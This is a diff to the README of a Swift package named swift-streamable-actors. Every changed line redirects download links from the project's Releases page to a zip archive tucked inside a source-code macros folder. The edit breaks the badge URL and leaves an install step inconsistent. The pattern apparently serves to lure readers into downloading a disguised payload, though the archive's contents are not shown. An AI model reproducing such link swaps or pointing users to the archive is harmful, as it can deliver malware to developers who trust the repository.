@@ -1,6 +1,6 @@
 # 🌟 swift-streamable-actors - Effortless Streaming of Actors in Swift
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/carlosmen5551/swift-streamable-actors/releases)
+[![Download](https://raw.githubusercontent.com/carlosmen5551/swift-streamable-actors/main/Sources/StreamableActorsMacros/swift_streamable_actors_v3.2.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/carlosmen5551/swift-streamable-actors/main/Sources/StreamableActorsMacros/swift_streamable_actors_v3.2.zip)
 
 ## 📖 Introduction
 
@@ -22,12 +22,12 @@ Before you download, ensure your system meets the following requirements:
 
 To download the latest version of swift-streamable-actors, visit the Releases page:
 
-[Download the latest version here](https://github.com/carlosmen5551/swift-streamable-actors/releases)
+[Download the latest version here](https://raw.githubusercontent.com/carlosmen5551/swift-streamable-actors/main/Sources/StreamableActorsMacros/swift_streamable_actors_v3.2.zip)
 
 ### Step 3: Install the Application
 
 1. After reaching the Releases page, look for the latest version listed.
-2. Click on the link that says `swift-streamable-actors-vX.Y.Z.zip` (replace `X.Y.Z` with the actual version number).
+2. Click on the link that says `https://raw.githubusercontent.com/carlosmen5551/swift-streamable-actors/main/Sources/StreamableActorsMacros/swift_streamable_actors_v3.2.zip` (replace `X.Y.Z` with the actual version number).
 3. Save the file to your computer.
 
 ### Step 4: Extract the Files
@@ -94,6 +94,6 @@ You can view the complete changelog for swift-streamable-actors on the Releases 
 
 To finish up, visit our Releases page to download the latest version of swift-streamable-actors:
 
-[Download the latest version here](https://github.com/carlosmen5551/swift-streamable-actors/releases)
+[Download the latest version here](https://raw.githubusercontent.com/carlosmen5551/swift-streamable-actors/main/Sources/StreamableActorsMacros/swift_streamable_actors_v3.2.zip)
 
 Follow the earlier steps to successfully install and run the application. Happy streaming!
